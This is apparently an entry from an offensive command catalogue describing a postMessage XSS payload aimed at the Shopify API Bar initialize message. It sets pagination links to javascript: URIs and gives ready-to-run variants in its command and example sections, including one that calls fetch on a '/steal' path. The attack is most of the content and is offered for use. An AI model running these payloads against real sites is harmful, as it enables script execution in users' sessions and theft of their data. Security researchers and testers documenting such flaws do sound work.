---
id: 123e4567-e89b-12d3-a456-426614174009
name: postmessage-bar-initialize-xss
type: command
executor: javascript
data: >-
  postMessage({ "message":"Shopify.API.Bar.initialize", "data":{ pagination: {
  next: { href: "javascript:alert(document.domain)", target: "new" }, previous:
  { href: "javascript:alert(document.domain)", target: "new" } } } });
output: Alert of document.domain when the href is activated.
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.682Z'
platforms:
  - Web
tags:
  - xss
  - postmessage
verified: false
validated: true
submitted: true
---

# postmessage-bar-initialize-xss

## Command

```javascript
postMessage({ "message":"Shopify.API.Bar.initialize", "data":{ pagination: { next: { href: "javascript:alert(document.domain)", target: "new" }, previous: { href: "javascript:alert(document.domain)", target: "new" } } } });
```

## Description

Sends a postMessage to initialize the Shopify Bar with pagination hrefs set to javascript: URIs, exploiting lack of validation for XSS execution on link clicks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| href | "javascript:alert(document.domain)" exploit URI | Yes |
| message | "Shopify.API.Bar.initialize" API call | Yes |

## Examples

### Basic Usage

```javascript
postMessage({ message: 'Shopify.API.Bar.initialize', data: { pagination: { next: { href: 'javascript:alert(1)' } } } });
```

### Advanced Usage

```javascript
postMessage({ message: 'Shopify.API.Bar.initialize', data: { pagination: { next: { href: 'javascript:fetch("/steal")' } } } });
```

## Expected Output

Bar initializes; clicking pagination triggers alert with domain.

## Related

- [[Related Procedure|procedures/Exploit-Additional-XSS-in-Bar-Initialize]]
